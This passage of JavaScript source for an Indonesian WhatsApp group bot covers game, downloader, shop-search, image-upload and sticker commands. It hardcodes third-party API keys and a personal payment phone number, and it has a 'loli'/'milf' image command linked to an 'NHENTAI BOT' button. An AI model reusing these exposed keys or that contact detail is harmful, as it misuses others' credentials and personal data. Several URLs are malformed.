`*🎳 Memulai Game Tictactoe 🎲*

[@${player2.split('@')[0]}] Menantang anda untuk menjadi lawan Game🔥
Ketik Y/N untuk menerima atau menolak permainan

Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contextInfo: {mentionedJid: [player2]}})
              await limitAdd(sender)
break
       case 'slot':
       
       sticWait(from)
       if (isBanned) return reply('Lu udh kena ban')
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              const sotoy = ['🍊 : 🍒 : 🍐','🍒 : ?? : 🍊','?? : 🍒 : 🍐','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔','🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌','🍇 : ?? : 🍇']
              somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              somtoyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              somtoyyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              if (somtoyy  == '🍌 : 🍌 : 🍌') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '?? : 🍒 : 🍒') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '🔔 : 🔔 : 🔔') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '?? : 🍐 : 🍐') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '🍇 : 🍇 : 🍇') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU LOSE*  ]`)
}
checkLimit(sender)
await limitAdd(sender)
              await limitAdd(sender)
break
       case 'suit': //nyolong dari zenz
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              if (!q) return reply(`Kirim perintah ${prefix}suit gunting / batu / kertas`)
              const userspilih = q
              if (!userspilih.match(/batu|gunting|kertas/)) return reply(`Pilih batu, kertas, gunting`)
              var computer = Math.random();
              if (computer < 0.34 ) {
              computer = 'batu';
              } else if( computer >= 0.34 && computer < 0.67) {
              computer = 'gunting';
              } else {
              computer = 'kertas';
}
              if ( userspilih == computer ) {
              reply(`Pertandingan Seri!`)
              } else if ( userspilih == 'batu' ) {
              if( computer == 'gunting' ) {
              reply(`Kamu memilih Batu dan bot Gunting\nKamu menang!`)
              } else {
              reply(`Kamu memilih Batu dan bot memilih Kertas\nKamu kalah!`)
}
              } else if ( userspilih == 'gunting' ) {
              if( computer == 'batu' ) {
              reply(`Kamu memilih Gunting dan bot memilih Batu\nKamu kalah!`)
              } else {
              reply(`Kamu memilih Gunting dan bot Kertas\nKamu menang!`)
}
              } else if ( userspilih == 'kertas' ) {
              if( computer == 'batu' ) {
              reply(`Kamu memilih Kertas dan bot Batu\nKamu menang!`)
              } else {
              reply(`Kamu memilih Kertas dan bot memilih Gunting\nKamu kalah`)
}
}

              await limitAdd(sender)
break
//------------------< Sewa >-------------------

//------------------< Premium >-------------------
       case 'belipremium':
       case 'buypremium':
       case 'sewabot':
              gopeynya = 'httpsl://telegra.ph/file/58f6d9179e497062a84b0.jpg'
              teksnya = `*── 「 PRICE LIST 」 ──*

*Katashi SEWA BOT WA*
FITUR:ANTILINK,WELCOME,ADD,KICK,DEMOTE,DAN MASIH BANYAK LAGI

HARGA PERMANEN:~15k~ PROMO!!! *5k* MINAT? HUBUNGI OWNER`
              dha.sendMessage(from, await getBuffer(gopeynya), image, {quoted: mek, caption: teksnya })
              
break             
//------------------< bayar menu >-------------------  
case 'bayar':
gopeynya = 'httpsl://telegra.ph/file/58f6d9179e497062a84b0.jpg'
teksnya = ` *「PAYMENT」*
• GOPAY : scan diatas
• DANA : 081932664252
• OVO : scan diatas
• QRISS DI ATAS 
━━━━━━━━━━━━━━━━━━━━`
        dha.sendMessage(from, await getBuffer(gopeynya), image, {quoted: ftoko, caption: teksnya })
              
break
 

case 'buttonpen':
              gopeynya = 'httpsl://telegra.ph/file/58f6d9179e497062a84b0.jpg'
              teksnya = `*「NULIS MENU」*
│◦➛* ${prefix}nulis*`
              dha.sendMessage(from, await getBuffer(gopeynya), image, {quoted: ftoko, caption: teksnya })
              
break

			
                                                                                                                        
//------------------< Sticker Cmd >-------------------
       case 'addcmd': 
       case 'setcmd':
       sticWait(from)
					        
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              if (isQuotedSticker) {
              if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
              var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
              addCmd(kodenya, q)
              textImg("Done!")
              } else {
              reply('tag stickenya')
}
              
break
       case 'delcmd':
       sticWait(from)
					        
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
              var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
            _scommand.splice(getCommandPosition(kodenya), 1)
              fs.writeFileSync('./database/bot/scommand.json', JSON.stringify(_scommand))
              textImg("Done!")
              
break
       case 'listcmd':
              let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
              let cemde = [];
              for (let i of _scommand) {
              cemde.push(i.id)
              teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`
}
              mentions(teksnyee, cemde, true)
              
break
//------------------< self and public >---------------------
//------------------< Downloader/Search/Anime >-------------------
       case 'image':
       case 'gimage':
       case 'googleimage':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              if (args.length < 1) return reply('Apa Yang Mau Dicari?')
              sticWait(from)
              teks = args.join(' ')
              res = await googleImage(teks, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
              else {
              gugIm = result
              random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: mek, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
await limitAdd(sender)
break
      case 'ytmp3':
      sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
            if (args.length < 1) return reply('Link Nya Mana?')
            if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
            teks = args.join(' ')
            sticWait(from)
            res = await y2mateA(teks).catch(e => {
            reply('_[ ! ] Error Gagal Dalam Memasuki Web Y2mate_')
})
            result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`き⃟🦈 Title : ${res[0].judul}\`\`\`
\`\`\`き⃟🦈 Ext : MP3\`\`\`
\`\`\`き⃟🦈 Size : ${res[0].size}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

            sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: mek}).then((lalu) => {
            sendFileFromUrl(res[0].link, document, {quoted: mek, mimetype: 'audio/mp3', filename: res[0].output})
})
await limitAdd(sender)
break
     case 'ytmp4':
     sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
            sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
            if (args.length < 1) return reply('Link Nya Mana?')
            if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
            teks = args.join(' ')
            sticWait(from)
            res = await y2mateV(teks).catch(e => {
            reply('_[ ! ] Error Gagal Memasuki Web Y2mate_')
})
            result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`き⃟🦈 Title : ${res[0].judul}\`\`\`
\`\`\`き⃟🦈 Ext : MP4\`\`\`
\`\`\`き⃟🦈 Size : ${res[0].size}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

            sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: mek}).then((lalu) => {
            sendFileFromUrl(res[0].link, video, {quoted: mek, mimetype: 'video/mp4', filename: res[0].output})
})
await limitAdd(sender)
break
        case 'mediafire':
        sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
               sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
               if (args.length < 1) return reply('Link Nya Mana? ')
               if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.Iv)
               sticWait(from)
               teks = args.join(' ')
               res = await mediafireDl(teks)
               result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *MEDIAFIRE DOWNLOAD*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`き⃟🦈 Nama : ${res[0].nama}\`\`\`
\`\`\`き⃟🦈 Ukuran : ${res[0].size}\`\`\`
\`\`\`き⃟🦈 Link : ${res[0].link}\`\`\`

_*Tunggu Proses Upload Media......*_`
             reply(result)
             sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: mek})
             await limitAdd(sender)
break
      case 'twitter':
      sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
             if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
             if (!q) return reply('Linknya?')
             ten = args[0]
             var res = await twitterGetUrl(`${ten}`)
            .then(g => {
             ren = `${g.download[2].url}`
             sendMediaURL(from,ren,'Done')
})
             await limitAdd(sender)
break
    case 'otakuongoing':
    sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
               o = await onGoing()
               console.log(o)
               ot = '*「 Ongoing Otakudesu 」*'
               for (let i = 0; i < o.length; i++) {
               ot += `\n\n*Judul :* ${o[i].judul}\n*Episode :* ${o[i].eps}\n*Eps berikutnya pada hari :* ${o[i].hri}\n*Tanggal :* ${o[i].tgl}\n\n*Image :* ${o[i].thumb}`
}
               buff = await getBuffer(o[0].thumb)
               dha.sendMessage(from, buff, image, {quoted: mek, caption: ot})
               await limitAdd(sender)
break
       case 'loli':
       case 'husbu':
       case 'milf':
       case 'cosplay':
       case 'wallml':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}nhentaibot`,buttonText:{displayText:'NHENTAI BOT'},type:1}]
              imageMsg = ( await dha.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await dha.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              dha.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              await limitAdd(sender)
break
        case 'playy':
case 'lagu':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length < 1) return reply('Apa Yang Mau Dicari?')
teks = args.join(' ')
sticWait(from)
if (!teks.endsWith("-doc")){
res = await yts(`${teks}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
reply(` Playing ${res.all[0].title}`)
let thumbInfo = ` *Youtube Search*
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
/////////////sendFileFromUrl(res.all[0].image, image, {quoted: mek, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendFileFromUrl(res[0].link, audio, {quoted: mek, mimetype: 'audio/mp4', filename: res[0].output})
}
if (teks.endsWith("-doc")){
const tec = teks.split("-doc")
res = await yts(`${tec}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
reply(`.Playing ${res.all[0].title}`)
let thumbInfo = `*${botname}* 
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
sendFileFromUrl(res.all[0].image, image, {quoted: mek, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendFileFromUrl(res[0].link, document, {quoted: mek, mimetype: 'audio/mp3', filename: res[0].output})
}
await limitAdd(sender)
break
case 'play2':   
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
				  if (args.length < 1) return reply('*Masukan judul nya?*')
                reply('Loading.... ')
				play = args.join(" ")
				anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?q=${play}&apikey=${setting.zekskey}`)
				if (anu.error) return reply(anu.error)
				infomp3 = `*「 PLAY VIDEO 」*
				
Judul : ${anu.result.title}
Source : ${anu.result.source}
				
*[Wait] Tunggu Sebentar..*`
				///////buffer = await getBuffer(anu.result.thumbnail)
				buffer1 = await getBuffer(anu.result.url_video)
				dha.sendMessage(from, buffer1, video, {mimetype: 'video/mp4', filename: `${anu.result.video}.mp4`, quoted:freply, caption: 'Nih Gan'})
					await limitAdd(sender)
break  
				case 'play':
				sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              if (!q) return reply('Linknya?')
              buttons = [{buttonId: `${prefix}play2 ${q}`,buttonText:{displayText: `🎥 Video`},type:1},{buttonId:`${prefix}playy ${q}`,buttonText:{displayText:'🎵 Mp3'},type:1}]
              imageMsg = (await dha.prepareMessageMedia(fs.readFileSync(`./media/ganteng.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/ganteng.jpg`)})).imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`Silahkan Pilih Media Yg Akan Di Download kak`,buttons,headerType:4}
              prep = await dha.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              dha.relayWAMessage(prep)
              await limitAdd(sender)
break
        case 'shopee':
               try {
               	sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
               if (args.length == 0) return reply(`Kirim perintah *${prefix}shopee [ query ]*\nContoh : ${prefix}shopee sepatu`)
               query = args.join(" ")
               sticWait(from)
               get_data = await fetchJson(`https://api.zeks.xyz/api/shopee?apikey=${setting.zekskey}&q=${query}`)
               get_data = get_data.data
               teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *SHOPEE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*\n`
for(let i = 0; i < get_data.length; i++) {
teks += `\`\`\`き⃟🦈 Nama : ${get_data[i].name}\`\`\`
\`\`\`き⃟🦈 Harga : ${get_data[i].harga}\`\`\`
\`\`\`き⃟🦈 Terjual : ${get_data[i].terjual}\`\`\`
\`\`\`き⃟🦈 Lokasi : ${get_data[i].location}\`\`\`
\`\`\`き⃟🦈 Deskripsi*: ${get_data[i].desc}\`\`\`
\`\`\`き⃟🦈 Stok : ${get_data[i].stock}\`\`\`
\`\`\`き⃟🦈 Informasi : ${get_data[i].information}\`\`\`
\`\`\`き⃟🦈 Link : ${get_data[i].url}\`\`\``
}
              ini_buffer = await getBuffer(get_data[0].img_detail[0])
              dha.sendMessage(from, ini_buffer, image, { quoted: mek, caption: teks })
              } catch {
              reply(`Maaf produk ${query} tidak ditemukan`)
}
              await limitAdd(sender)
break
       case 'playstore':
       
              try {
              	sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              if (args.length == 0) return reply(`Kirim perintah *${prefix}playstore [ apk ]*\nContoh : ${prefix}playstore pubg`)
              query = args.join(" ")
              sticWait(from)
              get_result = await fetchJson(`https://api.zeks.xyz/api/sgplay?apikey=${setting.zekskey}&q=${query}`)
              get_result = get_result.result
              teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *PLAYSTORE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*\n`
for(let i = 0; i < get_result.length; i++) {
teks += `\`\`\`き⃟🦈 Title : ${get_result[i].title}\`\`\`
\`\`\`き⃟🦈 Harga : ${get_result[i].price}\`\`\`
\`\`\`き⃟🦈 Rate : ${get_result[i].rating}\`\`\`
\`\`\`き⃟🦈 Link : ${get_result[i].url}\`\`\`

`
}
              ini_buffer = await getBuffer(get_result[0].thumb)
              dha.sendMessage(from, ini_buffer, image, { quoted: mek, caption: teks })
              } catch {
              reply(`Maaf aplikasi ${query} tidak ditemukan`)
}
              await limitAdd(sender)
break
       case 'tourl':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
               if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
               sticWait(from)
               boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
               owgi = await dha.downloadMediaMessage(boij)
               res = await uploadImages(owgi)
               reply(res)
               } else {
               reply('kirim/reply gambar/video')
}
               await limitAdd(sender)
break
       case 'imgtourl':
       case 'img2url':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
               sticWait(from) 
               var imgbb = require('imgbb-uploader')
               var encmedia  = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
               var media = await  dha.downloadAndSaveMediaMessage(encmedia)       
               imgbb('39d895963468b814fad0514bd28787e2', media)
              .then(data => {
               var caps = `*_IMAGE TO URL_*\n\n*~>  ID :* ${data.id}\n*~>  MimeType :* ${data.image.mime}\n*~>  Extension :* ${data.image.extension}\n*~>  URL :* ${data.display_url}`
               ibb = fs.readFileSync(media)
               dha.sendMessage(from, ibb, image, { quoted: mek, caption: caps})
})
              .catch(err => {
               throw err
})
               await limitAdd(sender)
break
        case 'nulis':
        case 'tulis':
        sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
               if (args.length < 1) return reply('Yang mau di tulis apaan?')
               teks = args.join(' ')
               sticWait(from)
               nulis = encodeURIComponent(teks)
               res = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)
               if (res.data.error) return reply(res.data.error)
               buff = Buffer.from(res.data.result.split(',')[1], 'base64')
               dha.sendMessage(from, buff, image, {quoted: mek, caption: mess.success}).catch(e => {
               return reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim File_')
})
               await limitAdd(sender)
break
//------------------< Level >-------------------
       
//------------------< Stalk >-------------------
     
                case 'ytchannel':
                case 'Ytchannel':
                sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                        if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
                        sticWait(from)
                        res = await axios.get(`https://api.zeks.me/api/ytchannel?apikey=CpGSLymOQy9KfTKgQZr9eDSYqqR&q=${query}`)
                        ttt = res.data.result
                        var eks = `* YOUTUBE CHANNEL *\n\n*Hasil Pencarian : ${body}*\n\n`
                        for(let i = 0; i < ttt.length; i++) {
                            eks += `*Nama* : ${ttt[i].title}\n*Deskripsi*: ${ttt[i].description}\n*Verified* : ${ttt[i].verified}\n*Jumlah video*: ${ttt[i].video_count}\n*Subcriber*: ${ttt[i].subscriber_count}\n*Link*: ${ttt[i].url}\n\n`
                        }
                        reply(eks)
                    await limitAdd(sender)
break
case 'ytplaylist':
case 'Ytplaylist':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                        if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
                        sticWait(from)
                        res = await axios.get(`https://api.zeks.me/api/ytplaylist?apikey=CpGSLymOQy9KfTKgQZr9eDSYqqR&q=${query}`)
                        ttt = res.data.result
                        var teks = `* YOUTUBE PLAYLIST *\n\n*Hasil Pencarian : ${body}*\n\n`
                        for(let i = 0; i < ttt.length; i++) {
                            teks += `*Nama* : ${ttt[i].title}\n*Jumlah video*: ${ttt[i].video_count}\n*Channel*: ${ttt[i].uploader.username}\n*Link*: ${ttt[i].url}\n\n`
                        }
                        reply(teks)
                        await limitAdd(sender)
break
              
//------------------< Sticker/Tools >-------------------

              
      case 'doge':
      sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              sticWait(from)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              sendWebp(from, pjr)
}
)
              await limitAdd(sender)
break
       case 'patrick':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              sticWait(from)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              sendWebp(from, pjr)
}
)
              await limitAdd(sender)
break
       case 'gura':
       case 'gawrgura':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              sticWait(from)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              sendWebp(from, pjr)
}
)
              await limitAdd(sender)
break
       case 'animestick':
       case 'stickeranime':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              sticWait(from)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
             .then(res => res.text())
             .then(body => {
              let todd = body.split("\n");
              let pjrr = todd[Math.floor(Math.random() * todd.length)];
              sendWebp(from, pjrr)
}
)
              await limitAdd(sender)
break
       case 'gifstiker':
				case 's':
			case 'stickergif':  
				case 'sticker':
				  case 'stiker':
				sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
					     if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            const media = await dha.downloadAndSaveMediaMessage(encmedia)
                ran = '666.webp'
                await ffmpeg(`./${media}`)
                .input(media)
                .on('start', function (cmd) {
                     console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                 console.log(`Error : ${err}`)
                fs.unlinkSync(media)
                reply('error')
                })
                .on('end', function () {
                console.log('Finish')
                dha.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
                 fs.unlinkSync(media)
                fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
                } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                const media = await dha.downloadAndSaveMediaMessage(encmedia)
            ran = '999.webp'
            sticWait(from)
            await ffmpeg(`./${media}`)
            .inputFormat(media.split('.')[1])
            .on('start', function (cmd) {
            console.log(`Started : ${cmd}`)
            })
            .on('error', function (err) {
            console.log(`Error : ${err}`)
            fs.unlinkSync(media)
            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
            reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
            })
            .on('end', function () {
            console.log('Finish')
            dha.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
            fs.unlinkSync(media)
            fs.unlinkSync(ran)
                })
